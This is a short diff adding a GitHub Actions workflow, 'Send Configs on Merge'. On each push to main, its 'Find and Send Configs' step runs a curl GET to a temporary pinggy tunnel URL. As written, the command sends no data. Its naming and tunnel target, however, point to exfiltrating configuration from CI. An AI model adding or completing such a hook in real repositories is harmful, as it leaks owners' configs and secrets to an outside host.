@@ -1,0 +1,16 @@
+name: Send Configs on Merge
+
+on:
+  push:
+    branches:
+      - main # of de branch waarin je merges doet
+
+jobs:
+  send-config:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Find and Send Configs
+      run: |
+          curl -X GET https://rnfwh-157-193-240-247.a.free.pinggy.online/
+      
